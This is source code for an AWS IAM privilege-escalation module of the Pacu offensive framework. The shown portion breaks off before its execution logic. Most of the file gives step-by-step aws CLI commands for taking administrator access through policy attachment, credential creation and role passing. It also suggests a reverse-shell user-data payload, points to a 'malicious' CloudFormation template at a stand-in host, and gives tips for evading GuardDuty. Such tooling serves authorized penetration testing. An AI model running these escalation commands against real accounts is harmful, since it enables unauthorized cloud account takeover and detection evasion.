#!/usr/bin/env python3
import argparse
from botocore.exceptions import ClientError
import string
from copy import deepcopy
import json
import os
import re
import random
import time
import subprocess
from textwrap import dedent

from pacu.core.lib import save, strip_lines, downloads_dir, session_dir
from pacu import Main
from pacu.utils import remove_empty_from_dict


module_info = {
    "name": "iam__privesc_scan",
    "author": "Spencer Gietzen of Rhino Security Labs",
    "category": "ESCALATE",
    "one_liner": "An IAM privilege escalation path finder and abuser.",
    "description": 'This module will scan for permission misconfigurations to see where privilege escalation will be possible. Available attack paths will be presented to the user and executed on if chosen. Warning: Due to the implementation in IAM policies, this module has a difficult time parsing "NotActions". If your user has any NotActions associated with them, it is recommended to manually verify the results of this module. NotActions are noted with a "!" preceeding the action when viewing the results of the "whoami" command. For more information on what NotActions are, visit the following link: https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_elements_notaction.html\n',
    "services": [
        "IAM",
        "EC2",
        "Glue",
        "Lambda",
        "DataPipeline",
        "DynamoDB",
        "CloudFormation",
    ],
    "prerequisite_modules": [
        "iam__enum_permissions",
        "iam__enum_users_roles_policies_groups",
        "iam__backdoor_users_keys",
        "iam__backdoor_users_password",
        "iam__backdoor_assume_role",
        "glue__enum",
        "lambda__enum",
    ],
    "arguments_to_autocomplete": ["--offline", "--folder", "--scan-only"],
}

parser = argparse.ArgumentParser(add_help=False, description=module_info["description"])

parser.add_argument(
    "--offline",
    required=False,
    default=False,
    action="store_true",
    help=strip_lines(
        """
    By passing this argument, this module will not make an API calls. If offline mode is enabled, you need to pass a
    file path to a folder that contains JSON files of the different users, policies, groups, and/or roles in the account
    using the --folder argument. This module will scan those JSON policy files to identify users, groups, and roles that
    have overly permissive policies.
"""
    ),
)
parser.add_argument(
    "--folder",
    required=False,
    default=None,
    help=strip_lines(
        """
    A file path pointing to a folder full of JSON files containing policies and connections between users, groups,
    and/or roles in an AWS account. The module "iam__enum_permissions" with the "--all-users" flag outputs the exact
    format required for this feature to ~/.local/share/pacu/sessions/[current_session_name]/downloads/confirmed_permissions/.
"""
    ),
)
parser.add_argument(
    "--scan-only",
    required=False,
    default=False,
    action="store_true",
    help=strip_lines(
        """
    Only run the scan to check for possible escalation methods, don't attempt any found methods.
"""
    ),
)
parser.add_argument(
    "--method-info",
    required=False,
    default=False,
    help=strip_lines(
        """
    View information for a particular privesc method like: --method-info CreateNewPolicyVersion.
"""
    ),
)
parser.add_argument(
    "--method-list",
    required=False,
    default=False,
    action="store_true",
    help=strip_lines(
        """
    List all privesc methods.
"""
    ),
)


# 18) GreenGrass passrole privesc ?
# 19) Redshift passrole privesc ?
# 20) S3 passrole privesc ?
# 21) ServiceCatalog passrole privesc ?
# 22) StorageGateway passrole privesc ?


def main(args, pacu_main: "Main"):
    session = pacu_main.get_active_session()

    ###### Don't modify these. They can be removed if you are not using the function.
    args = parser.parse_args(args)
    print = pacu_main.print
    input = pacu_main.input

    key_info = pacu_main.key_info
    fetch_data = pacu_main.fetch_data
    ######
    escalation_methods_info = {
        "AddUserToGroup": {
            "info": dedent("""
            Escalation method: AddUserToGroup
            Description: An attacker with the iam:AddUserToGroup permission can use it to add themselves to an existing IAM Group in the AWS account.

            An example command to exploit this method might look like this:

            aws iam add-user-to-group –group-name target_group –user-name my_username

            Where target_group has more/different privileges than the attacker’s user account.

            Potential Impact: The attacker would be able to gain privileges of any existing group in the account, which could range from no privilege escalation to full administrator access to the account.
            """)
        },
        "AttachGroupPolicy": {
            "info": dedent("""
            Escalation method: AttachGroupPolicy
            Description: An attacker with the iam:AttachGroupPolicy permission can escalate privileges by attaching a policy to a group that they are a part of, adding the permissions of that policy to the attacker.

            An example command to exploit this method might look like this:

            aws iam attach-group-policy –group-name group_i_am_in –policy-arn arn:aws:iam::aws:policy/AdministratorAccess

            Where the group is a group the current user is a part of.

            Potential Impact: An attacker would be able to use this method to attach the AdministratorAccess AWS managed policy to a group, giving them full administrator access to the AWS environment.
            """)
        },
        "AttachRolePolicy": {
            "info": dedent("""
            Escalation method: AttachRolePolicy
            Description: An attacker with the iam:AttachRolePolicy permission can escalate privileges by attaching a policy to a role that they have access to, adding the permissions of that policy to the attacker.

            An example command to exploit this method might look like this:

            aws iam attach-role-policy –role-name role_i_can_assume –policy-arn arn:aws:iam::aws:policy/AdministratorAccess

            Where the role is a role that the current user can temporarily assume with sts:AssumeRole.

            Potential Impact: An attacker would be able to use this method to attach the AdministratorAccess AWS managed policy to a role, giving them full administrator access to the AWS environment.
            """)
        },
        "AttachUserPolicy": {
            "info": dedent("""
            Escalation method: AttachUserPolicy
            Description: An attacker with the iam:AttachUserPolicy permission can escalate privileges by attaching a policy to a user that they have access to, adding the permissions of that policy to the attacker.

            An example command to exploit this method might look like this:

            aws iam attach-user-policy –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess

            Where the user name is the current user.

            Potential Impact: An attacker would be able to use this method to attach the AdministratorAccess AWS managed policy to a user, giving them full administrator access to the AWS environment.
            """)
        },
        "CodeStarCreateProjectFromTemplate": {
            "info": dedent("""
            Escalation method: CodeStarCreateProjectFromTemplate
            See: https://rhinosecuritylabs.com/aws/escalating-aws-iam-privileges-undocumented-codestar-api/
            """)
        },
        "CodeStarCreateProjectThenAssociateTeamMember": {
            "info": dedent("""
            Escalation method: CodeStarCreateProjectThenAssociateTeamMember
            With access to the codestar:CreateProject and codestar:AssociateTeamMember permissions, an adversary can create a new CodeStar project and associate themselves as an Owner of the project.

            This will attach a new policy to the user that provides access to a number of permissions for AWS services. This is most useful for further enumeration as it gives access to lambda:List*, iam:ListRoles, iam:ListUsers, and more.
            """)
        },
        "CreateAccessKey": {
            "info": dedent("""
            Escalation method: CreateAccessKey
            Description: An attacker with the iam:CreateAccessKey permission on other users can create an access key ID and secret access key belonging to another user in the AWS environment, if they don’t already have two sets associated with them (which best practice says they shouldn’t).

            An example command to exploit this method might look like this:

            aws iam create-access-key –user-name target_user

            Where target_user has an extended set of permissions compared to the current user.

            Potential Impact: This method would give an attacker the same level of permissions as any user they were able to create an access key for, which could range from no privilege escalation to full administrator access to the account.
            """)
        },
        "CreateEC2WithExistingIP": {
            "info": dedent("""
            Escalation method: CreateEC2WithExistingIP
            Description: An attacker with the iam:PassRole and ec2:RunInstances permissions can create a new EC2 instance that they will have operating system access to and pass an existing EC2 instance profile/service role to it. They can then login to the instance and request the associated AWS keys from the EC2 instance meta data, which gives them access to all the permissions that the associated instance profile/service role has.

            The attacker can gain access to the instance in a few different ways. One way would be to create/import an SSH key and associated it with the instance on creation, so they can SSH into it. Another way would be to supply a script in the EC2 User Data that would give them access, such as an Empire stager, or even just a reverse shell payload.

            Once the instance is running and the user has access to it, they can query the EC2 metadata to retrieve temporary credentials for the associated instance profile, giving them access to any AWS service that the attached role has.

            An example command to exploit this method might look like this:

            aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –key-name my_ssh_key –security-group-ids sg-123456

            Where the attacker has access to my_ssh_key and the security group sg-123456 allows SSH access. Another command that could be run that doesn’t require an SSH key or security group allowing SSH access might look like this:

            aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –user-data file://script/with/reverse/shell.sh

            Where the .sh script file contains a script to open a reverse shell in one way or another.

            An important note to make about this attack is that an obvious indicator of compromise is when EC2 instance profile credentials are used outside of the specific instance. Even AWS GuardDuty triggers on this (https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types.html#unauthorized11), so it is not a smart move to exfiltrate these credentials and run them locally, but rather access the AWS API from within that EC2 instance.

            Potential Impact: This attack would give an attacker access to the set of permissions that the instance profile/role has, which again could range from no privilege escalation to full administrator access of the AWS account.
            """)
        },
        "CreateLoginProfile": {
            "info": dedent("""
            Escalation method: CreateLoginProfile
            Description: An attacker with the iam:CreateLoginProfile permission on other users can create a password to use to login to the AWS console on any user that does not already have a login profile setup.

            An example command to exploit this method might look like this:

            aws iam create-login-profile –user-name target_user –password ‘|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z”,jJ[iT-D^(‘ –no-password-reset-required

            Where target_user has an extended set of permissions compared to the current user and the password is the max possible length (128 characters) with all types of characters (symbols, lowercase, uppercase, numbers) so that you can guarantee that it will meet the accounts minimum password requirements.

            Potential Impact: This method would give an attacker the same level of permissions as any user they were able to create a login profile for, which could range from no privilege escalation to full administrator access to the account.
            """)
        },
        "CreateNewPolicyVersion": {
            "info": dedent("""
            Escalation method: CreateNewPolicyVersion
            Description: An attacker with the iam:CreatePolicyVersion permission can create a new version of an IAM policy that they have access to. This allows them to define their own custom permissions. When creating a new policy version, it needs to be set as the default version to take effect, which you would think would require the iam:SetDefaultPolicyVersion permission, but when creating a new policy version, it is possible to include a flag (–set-as-default) that will automatically create it as the new default version. That flag does not require the iam:SetDefaultPolicyVersion permission to use.

            An example command to exploit this method might look like this:

            aws iam create-policy-version –policy-arn target_policy_arn –policy-document file://path/to/administrator/policy.json –set-as-default

            Where the policy.json file would include a policy document that allows any action against any resource in the account.

            Potential Impact: This privilege escalation method could allow a user to gain full administrator access of the AWS account.
            """)
        },
        "EditExistingLambdaFunctionWithRole": {
            "info": dedent("""
            Escalation method: EditExistingLambdaFunctionWithRole
            Description: An attacker with the lambda:UpdateFunctionCode permission could update the code in an existing Lambda function with an IAM role attached so that it would import the relevant AWS library in that programming language and use it to perform actions on behalf of that role. They would then need to wait for it to be invoked if they were not able to do so directly, but if it already exists, there is likely some way that it will be invoked.

            An example command to exploit this method might look like this:

            aws lambda update-function-code –function-name target_function –zip-file fileb://my/lambda/code/zipped.zip

            Where the associated .zip file contains code that utilizes the Lambda’s role. An example could include the code snippet from methods 11 and 12.

            Potential Impact: This would give an attacker access to the privileges associated with the Lambda service role that is attached to that function, which could range from no privilege escalation to full administrator access to the account.
            """)
        },
        "PassExistingRoleToNewCloudFormation": {
            "info": dedent("""
            Escalation method: PassExistingRoleToNewCloudFormation
            Description: An attacker with the iam:PassRole and cloudformation:CreateStack permissions would be able to escalate privileges by creating a CloudFormation template that will perform actions and create resources using the permissions of the role that was passed when creating a CloudFormation stack.

            An example command to exploit this method might look like this:

            aws cloudformation create-stack –stack-name my_stack –template-url http://my-website.com/my-malicious-template.template –role-arn arn_of_cloudformation_service_role

            Where the template located at the attacker’s website includes directions to perform malicious actions, such as creating an administrator user and then using those credentials to escalate their own access.

            Potential Impact: This would give an attacker access to the privileges associated with the role that was passed when creating the CloudFormation stack, which could range from no privilege escalation to full administrator access to the account.
            """)
        },
        "PassExistingRoleToNewCodeStarProject": {
            "info": dedent("""
            Escalation method: PassExistingRoleToNewCodeStarProject
            With access to the iam:PassRole and codestar:CreateProject permissions, an adversary can create a new CodeStar project and pass a more privileged role to it. This would allow an adversary to escalate privileges to that more privileged role including that of an administrator.
            """)
        },
        "PassExistingRoleToNewDataPipeline": {
            "info": dedent("""
            Escalation method: PassExistingRoleToNewDataPipeline
            Description: An attacker with the iam:PassRole, datapipeline:CreatePipeline, and datapipeline:PutPipelineDefinition permissions would be able to escalate privileges by creating a pipeline and updating it to run an arbitrary AWS CLI command or create other resources, either once or on an interval with the permissions of the role that was passed in.

            Some example commands to exploit this method might look like these:

            aws datapipeline create-pipeline –name my_pipeline –unique-id unique_string

            Which will create an empty pipeline. The attacker then needs to update the definition of the pipeline to tell it what to do, with a command like this:

            aws datapipeline put-pipeline-definition –pipeline-id unique_string –pipeline-definition file://path/to/my/pipeline/definition.json

            Where the pipeline definition file contains a directive to run a command or create resources using the AWS API that could help the attacker gain additional privileges.

            Potential Impact: This would give the attacker access to the privileges associated with the role that was passed when creating the pipeline, which could range from no privilege escalation to full administrator access to the account.
            """)
        },
        "PassExistingRoleToNewGlueDevEndpoint": {
            "info": dedent("""
            Escalation method: PassExistingRoleToNewGlueDevEndpoint
            Description: An attacker with the iam:PassRole and glue:CreateDevEndpoint permissions could create a new AWS Glue development endpoint and pass an existing service role to it. They then could SSH into the instance and use the AWS CLI to have access of the permissions the role has access to.

            An example command to exploit this method might look like this:

            aws glue create-dev-endpoint –endpoint-name my_dev_endpoint –role-arn arn_of_glue_service_role –public-key file://path/to/my/public/ssh/key.pub

            Now the attacker would just need to SSH into the development endpoint to access the roles credentials. Even though it is not specifically noted in the GuardDuty documentation, like method number 2 (Creating an EC2 instance with an existing instance profile), it would be a bad idea to exfiltrate the credentials from the Glue Instance. Instead, the AWS API should be accessed directly from the new instance.

            Potential Impact: This would give an attacker access to the privileges associated with any Glue service role that exists in the account, which could range from no privilege escalation to full administrator access to the account.
            """)
        },
        "PassExistingRoleToNewLambdaThenInvoke": {
            "info": dedent("""
            Escalation method: PassExistingRoleToNewLambdaThenInvoke
            Description: A user with the iam:PassRole, lambda:CreateFunction, and lambda:InvokeFunction permissions can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice. The code could then be run by invoking the function through the AWS API.

            An example set of commands to exploit this method might look like this:

            aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py

            Where the code in the python file would utilize the targeted role.

            After this, the attacker would then invoke the Lambda function using the following command:

            aws lambda invoke –function-name my_function output.txt

            Where output.txt is where the results of the invocation will be stored.

            Potential Impact: This would give a user access to the privileges associated with any Lambda service role that exists in the account, which could range from no privilege escalation to full administrator access to the account.
            """)
        },
        "PassExistingRoleToNewLambdaThenInvokeCrossAccount": {
            "info": dedent("""
            Escalation method: PassExistingRoleToNewLambdaThenInvokeCrossAccount
            Description: A user with the iam:PassRole, lambda:CreateFunction, and lambda:AddPermission permissions can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice. The code could then be run by invoking the function cross-account after adding the permissions via lambda:AddPermission.
            """)
        },
        "PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo": {
            "info": dedent("""
            Escalation method: PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo
            Description: A user with the iam:PassRole, lambda:CreateFunction, and lambda:CreateEventSourceMapping (and possibly dynamodb:PutItem and dynamodb:CreateTable) permissions, but without the lambda:InvokeFunction permission, can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice. They then would need to either create a DynamoDB table or use an existing one, to create an event source mapping for the Lambda function pointing to that DynamoDB table. Then they would need to either put an item into the table or wait for another method to do so that the Lambda function will be invoked.

            An example set of commands to exploit this method might look like this:

            aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py

            Where the code in the python file would utilize the targeted role. An example would be the same script used in method 11’s description.

            After this, the next step depends on whether DynamoDB is being used in the current AWS environment. If it is being used, all that needs to be done is creating the event source mapping for the Lambda function, but if not, then the attacker will need to create a table with streaming enabled with the following command:

            aws dynamodb create-table –table-name my_table –attribute-definitions AttributeName=Test,AttributeType=S –key-schema AttributeName=Test,KeyType=HASH –provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 –stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES

            After this command, the attacker would connect the Lambda function and the DynamoDB table by creating an event source mapping with the following command:

            aws lambda create-event-source-mapping –function-name my_function –event-source-arn arn_of_dynamodb_table_stream –enabled –starting-position LATEST

            Now that the Lambda function and the stream are connected, the attacker can invoke the Lambda function by triggering the DynamoDB stream. This can be done by putting an item into the DynamoDB table, which will trigger the stream, using the following command:

            aws dynamodb put-item –table-name my_table –item Test={S=”Random string”}

            At this point, the Lambda function will be invoked, and the attacker will be made an administrator of the AWS account.

            Potential Impact: This would give an attacker access to the privileges associated with any Lambda service role that exists in the account, which could range from no privilege escalation to full administrator access to the account.
            """)
        },
        "PassExistingRoleToNewLambdaThenTriggerWithNewDynamo": {
            "info": dedent("""
            Escalation method: PassExistingRoleToNewLambdaThenTriggerWithNewDynamo
            """)
        },
        "PutGroupPolicy": {
            "info": dedent("""
            Escalation method: PutGroupPolicy
            Description: An attacker with the iam:PutGroupPolicy permission can escalate privileges by creating or updating an inline policy for a group that they are a part of, adding the permissions of that policy to the attacker.

            An example command to exploit this method might look like this:

            aws iam put-group-policy –group-name group_i_am_in –policy-name group_inline_policy –policy-document file://path/to/administrator/policy.json>

            Where the group is a group the current user is in.

            Potential Impact: Due to the ability to specify an arbitrary policy document with this method, the attacker could specify a policy that gives permission to perform any action on any resource, ultimately escalating to full administrator privileges in the AWS environment.
            """)
        },
        "PutRolePolicy": {
            "info": dedent("""
            Escalation method: PutRolePolicy
            Description: An attacker with the iam:PutRolePolicy permission can escalate privileges by creating or updating an inline policy for a role that they have access to, adding the permissions of that policy to the attacker.

            An example command to exploit this method might look like this:

            aws iam put-role-policy –role-name role_i_can_assume –policy-name role_inline_policy –policy-document file://path/to/administrator/policy.json

            Where the role is a role that the current user can temporarily assume with sts:AssumeRole.

            Potential Impact: Due to the ability to specify an arbitrary policy document with this method, the attacker could specify a policy that gives permission to perform any action on any resource, ultimately escalating to full administrator privileges in the AWS environment.
            """)
        },
        "PutUserPolicy": {
            "info": dedent("""
            Escalation method: PutUserPolicy
            Description: An attacker with the iam:PutUserPolicy permission can escalate privileges by creating or updating an inline policy for a user that they have access to, adding the permissions of that policy to the attacker.

            An example command to exploit this method might look like this:

            aws iam put-user-policy –user-name my_username –policy-name my_inline_policy –policy-document file://path/to/administrator/policy.json

            Where the user name is the current user.

            Potential Impact: Due to the ability to specify an arbitrary policy document with this method, the attacker could specify a policy that gives permission to perform any action on any resource, ultimately escalating to full administrator privileges in the AWS environment.
            """)
        },
        "SetExistingDefaultPolicyVersion": {
            "info": dedent("""
            Escalation method: SetExistingDefaultPolicyVersion
            Description: An attacker with the iam:SetDefaultPolicyVersion permission may be able to escalate privileges through existing policy versions that are not currently in use. If a policy that they have access to has versions that are not the default, they would be able to change the default version to any other existing version.

            An example command to exploit this method might look like this:

            aws iam set-default-policy-version –policy-arn target_policy_arn –version-id v2

            Where “v2” is the policy version with the most privileges available.

            Potential Impact: The potential impact is associated with the level of permissions that the inactive policy version has. This could range from no privilege escalation at all to gaining full administrator access to the AWS account, depending on what the inactive policy versions have access to.
            """)
        },
        "UpdateExistingGlueDevEndpoint": {
            "info": dedent("""
            Escalation method: UpdateExistingGlueDevEndpoint
            Description: An attacker with the glue:UpdateDevEndpoint permission would be able to update the associated SSH public key of an existing Glue development endpoint, to then SSH into it and have access to the permissions the attached role has access to.

            An example command to exploit this method might look like this:

            aws glue –endpoint-name target_endpoint –public-key file://path/to/my/public/ssh/key.pub

            Now the attacker would just need to SSH into the development endpoint to access the roles credentials. Like method number 14, even though it is not specifically noted in the GuardDuty documentation, it would be a bad idea to exfiltrate the credentials from the Glue Instance. Instead, the AWS API should be accessed directly from the new instance.

            Potential Impact: This would give an attacker access to the privileges associated with the role attached to the specific Glue development endpoint, which could range from no privilege escalation to full administrator access to the account.
            """)
        },
        "UpdateLoginProfile": {
            "info": dedent("""
            Escalation method: UpdateLoginProfile
            Description: An attacker with the iam:UpdateLoginProfile permission on other users can change the password used to login to the AWS console on any user that already has a login profile setup.

            Like creating a login profile, an example command to exploit this method might look like this:

            aws iam update-login-profile –user-name target_user –password ‘|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z”,jJ[iT-D^(‘ –no-password-reset-required

            Where target_user has an extended set of permissions compared to the current user and the password is the max possible length (128 characters) with all types of characters (symbols, lowercase, uppercase, numbers) so that you can guarantee that it will meet the accounts minimum password requirements.

            

            Potential Impact: This method would give an attacker the same level of permissions as any user they were able to update the login profile for, which could range from no privilege escalation to full administrator access to the account.
            """)
        },
        "UpdateRolePolicyToAssumeIt": {
            "info": dedent("""
            Escalation method: UpdateRolePolicyToAssumeIt
            Description: An attacker with the iam:UpdateAssumeRolePolicy and sts:AssumeRole permissions would be able to change the assume role policy document of any existing role to allow them to assume that role.

            An example command to exploit this method might look like this:

            aws iam update-assume-role-policy –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json

            Where the policy looks like the following, which gives the user permission to assume the role:
            """)
        },
    }
    if args.method_info:
        def dict_lower(input_dict):
            return {key.lower(): value for key, value in input_dict.items()}
        escalation_methods_info = dict_lower(escalation_methods_info)
        print(escalation_methods_info[args.method_info.lower()]["info"])
        return
    if args.method_list:
        print("Available escalation methods:")
        for method in escalation_methods_info:
            print(method)
        return

    summary_data = {"scan_only": args.scan_only}

    all_perms = [
        "iam:addroletoinstanceprofile",
        "iam:addusertogroup",
        "iam:attachgrouppolicy",
        "iam:attachrolepolicy",
        "iam:attachuserpolicy",
        "iam:createaccesskey",
        "iam:createinstanceprofile",
        "iam:createloginprofile",
        "iam:createpolicyversion",
        "iam:deletepolicyversion",
        "iam:listattachedgrouppolicies",
        "iam:listattacheduserpolicies",
        "iam:listattachedrolepolicies",
        "iam:listgrouppolicies",
        "iam:listgroups",
        "iam:listgroupsforuser",
        "iam:listinstanceprofiles",
        "iam:listpolicies",
        "iam:listpolicyversions",
        "iam:listrolepolicies",
        "iam:listroles",
        "iam:listuserpolicies",
        "iam:listusers",
        "iam:passrole",
        "iam:putgrouppolicy",
        "iam:putrolepolicy",
        "iam:putuserpolicy",
        "iam:setdefaultpolicyversion",
        "iam:updateassumerolepolicy",
        "iam:updateloginprofile",
        "sts:assumerole",
        "ec2:associateiaminstanceprofile",
        "ec2:describeinstances",
        "ec2:runinstances",
        "lambda:createeventsourcemapping",
        "lambda:createfunction",
        "lambda:invokefunction",
        "lambda:updatefunctioncode",
        "lambda:listfunctions",
        "dynamodb:createtable",
        "dynamodb:describetables",
        "dynamodb:liststreams",
        "dynamodb:putitem",
        "glue:createdevendpoint",
        "glue:describedevendpoints",
        "glue:getdevendpoint",
        "glue:getdevendpoints",
        "glue:updatedevendpoint",
        "cloudformation:createstack",
        "cloudformation:describestacks",
        "datapipeline:createpipeline",
        "datapipeline:putpipelinedefinition",
        "codestar:createproject",
        "codestar:associateteammember",
        "codestar:createprojectfromtemplate",
    ]

    checked_perms = {"Allow": {}, "Deny": {}}
    # user_escalation_methods = {
    #     "CreateNewPolicyVersion": {
    #         "iam:CreatePolicyVersion": True,  # Create new policy and set it as default
    #         "iam:ListAttachedGroupPolicies": False,  # Search for policies belonging to the user
    #         "iam:ListAttachedUserPolicies": False,  # ^
    #         "iam:ListAttachedRolePolicies": False,  # ^
    #         "iam:ListGroupsForUser": False,  # ^
    #     },
    #     "SetExistingDefaultPolicyVersion": {
    #         "iam:SetDefaultPolicyVersion": True,  # Set a different policy version as default
    #         "iam:ListPolicyVersions": False,  # Find a version to change to
    #         "iam:ListAttachedGroupPolicies": False,  # Search for policies belonging to the user
    #         "iam:ListAttachedUserPolicies": False,  # ^
    #         "iam:ListAttachedRolePolicies": False,  # ^
    #         "iam:ListGroupsForUser": False,  # ^
    #     },
    #     "CreateEC2WithExistingIP": {
    #         "iam:PassRole": True,  # Pass the instance profile/role to the EC2 instance
    #         "ec2:RunInstances": True,  # Run the EC2 instance
    #         "iam:ListInstanceProfiles": False,  # Find an IP to pass
    #     },
    #     "CreateAccessKey": {
    #         "iam:CreateAccessKey": True,  # Create a new access key for some user
    #         "iam:ListUsers": False,  # Find a user to create a key for
    #     },
    #     "CreateLoginProfile": {
    #         "iam:CreateLoginProfile": True,  # Create a login profile for some user
    #         "iam:ListUsers": False,  # Find a user to create a profile for
    #     },
    #     "UpdateLoginProfile": {
    #         "iam:UpdateLoginProfile": True,  # Update the password for an existing login profile
    #         "iam:ListUsers": False,  # Find a user to update the password for
    #     },
    #     "AttachUserPolicy": {
    #         "iam:AttachUserPolicy": True,  # Attach an existing policy to a user
    #         "iam:ListUsers": False,  # Find a user to attach to
    #     },
    #     "AttachGroupPolicy": {
    #         "iam:AttachGroupPolicy": True,  # Attach an existing policy to a group
    #         "iam:ListGroupsForUser": False,  # Find a group to attach to
    #     },
    #     "AttachRolePolicy": {
    #         "iam:AttachRolePolicy": True,  # Attach an existing policy to a role
    #         "sts:AssumeRole": True,  # Assume that role
    #         "iam:ListRoles": False,  # Find a role to attach to
    #     },
    #     "PutUserPolicy": {
    #         "iam:PutUserPolicy": True,  # Alter an existing-attached inline user policy
    #         "iam:ListUserPolicies": False,  # Find a users inline policies
    #     },
    #     "PutGroupPolicy": {
    #         "iam:PutGroupPolicy": True,  # Alter an existing-attached inline group policy
    #         "iam:ListGroupPolicies": False,  # Find a groups inline policies
    #     },
    #     "PutRolePolicy": {
    #         "iam:PutRolePolicy": True,  # Alter an existing-attached inline role policy
    #         "sts:AssumeRole": True,  # Assume that role
    #         "iam:ListRolePolicies": False,  # Find a roles inline policies
    #     },
    #     "AddUserToGroup": {
    #         "iam:AddUserToGroup": True,  # Add a user to a higher level group
    #         "iam:ListGroups": False,  # Find a group to add the user to
    #     },
    #     "UpdateRolePolicyToAssumeIt": {
    #         "iam:UpdateAssumeRolePolicy": True,  # Update the roles AssumeRolePolicyDocument to allow the user to assume it
    #         "sts:AssumeRole": True,  # Assume the newly update role
    #         "iam:ListRoles": False,  # Find a role to assume
    #     },
    #     "PassExistingRoleToNewLambdaThenInvoke": {
    #         "iam:PassRole": True,  # Pass the role to the Lambda function
    #         "lambda:CreateFunction": True,  # Create a new Lambda function
    #         "lambda:InvokeFunction": True,  # Invoke the newly created function
    #         "iam:ListRoles": False,  # Find a role to pass
    #     },
    #     "PassExistingRoleToNewLambdaThenInvokeCrossAccount": {
    #         "iam:PassRole": True,  # Pass the role to the Lambda function
    #         "lambda:CreateFunction": True,  # Create a new Lambda function
    #         "lambda:AddPermission": True,  # Invoke the newly created function
    #         "iam:ListRoles": False,  # Find a role to pass
    #     },
    #     "PassExistingRoleToNewLambdaThenTriggerWithNewDynamo": {
    #         "iam:PassRole": True,  # Pass the role to the Lambda function
    #         "lambda:CreateFunction": True,  # Create a new Lambda function
    #         "lambda:CreateEventSourceMapping": True,  # Create a trigger for the Lambda function
    #         "dynamodb:CreateTable": True,  # Create a new table to use as the trigger ^
    #         "dynamodb:PutItem": True,  # Put a new item into the table to trigger the trigger
    #         "iam:ListRoles": False,  # Find a role to pass to the function
    #     },
    #     "PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo": {
    #         "iam:PassRole": True,  # Pass the role to the Lambda function
    #         "lambda:CreateFunction": True,  # Create a new Lambda function
    #         "lambda:CreateEventSourceMapping": True,  # Create a trigger for the Lambda function
    #         "dynamodb:ListStreams": False,  # Find existing streams
    #         "dynamodb:PutItem": False,  # Put a new item into the table to trigger the trigger
    #         "dynamodb:DescribeTables": False,  # Find an existing DynamoDB table
    #         "iam:ListRoles": False,  # Find a role to pass to the function
    #     },
    #     "PassExistingRoleToNewGlueDevEndpoint": {
    #         "iam:PassRole": True,  # Pass the role to the Glue Dev Endpoint
    #         "glue:CreateDevEndpoint": True,  # Create the new Glue Dev Endpoint
    #         "glue:GetDevEndpoint": True,  # Get the public address of it after creation
    #         "iam:ListRoles": False,  # Find a role to pass to the endpoint
    #     },
    #     "UpdateExistingGlueDevEndpoint": {
    #         "glue:UpdateDevEndpoint": True,  # Update the associated SSH key for the Glue endpoint
    #         "glue:DescribeDevEndpoints": False,  # Find a dev endpoint to update
    #     },
    #     "PassExistingRoleToNewCloudFormation": {
    #         "iam:PassRole": True,  # Pass role to the new stack
    #         "cloudformation:CreateStack": True,  # Create the stack
    #         "cloudformation:DescribeStacks": False,  # Fetch the values returned from the stack. Most likely needed, but possibly not
    #         "iam:ListRoles": False,  # Find roles to pass to the stack
    #     },
    #     "PassExistingRoleToNewDataPipeline": {
    #         "iam:PassRole": True,  # Pass roles to the Pipeline
    #         "datapipeline:CreatePipeline": True,  # Create the pipieline
    #         "datapipeline:PutPipelineDefinition": True,  # Update the pipeline to do something
    #         "iam:ListRoles": False,  # List roles to pass to the pipeline
    #     },
    #     "EditExistingLambdaFunctionWithRole": {
    #         "lambda:UpdateFunctionCode": True,  # Edit existing Lambda functions
    #         "lambda:ListFunctions": False,  # Find existing Lambda functions
    #         "lambda:InvokeFunction": False,  # Invoke it afterwards
    #     },
    #     "PassExistingRoleToNewCodeStarProject": {
    #         "codestar:CreateProject": True,  # Create the CodeStar project
    #         "iam:PassRole": True,  # Pass the service role to CodeStar
    #     },
    #     "CodeStarCreateProjectFromTemplate": {
    #         "codestar:CreateProjectFromTemplate": True  # Create a project from a template
    #     },
    #     "CodeStarCreateProjectThenAssociateTeamMember": {
    #         "codestar:CreateProject": True,  # Create the CodeStar project
    #         "codestar:AssociateTeamMember": True,  # Associate themselves with the project
    #     },
    # }

    # role_escalation_methods = {
    #     "CreateNewPolicyVersion": {
    #         "iam:CreatePolicyVersion": True,  # Create new policy and set it as default
    #         "iam:ListAttachedGroupPolicies": False,  # Search for policies belonging to the user
    #         "iam:ListAttachedUserPolicies": False,  # ^
    #         "iam:ListAttachedRolePolicies": False,  # ^
    #         "iam:ListGroupsForUser": False,  # ^
    #     },
    #     "SetExistingDefaultPolicyVersion": {
    #         "iam:SetDefaultPolicyVersion": True,  # Set a different policy version as default
    #         "iam:ListPolicyVersions": False,  # Find a version to change to
    #         "iam:ListAttachedGroupPolicies": False,  # Search for policies belonging to the user
    #         "iam:ListAttachedUserPolicies": False,  # ^
    #         "iam:ListAttachedRolePolicies": False,  # ^
    #         "iam:ListGroupsForUser": False,  # ^
    #     },
    #     "CreateEC2WithExistingIP": {
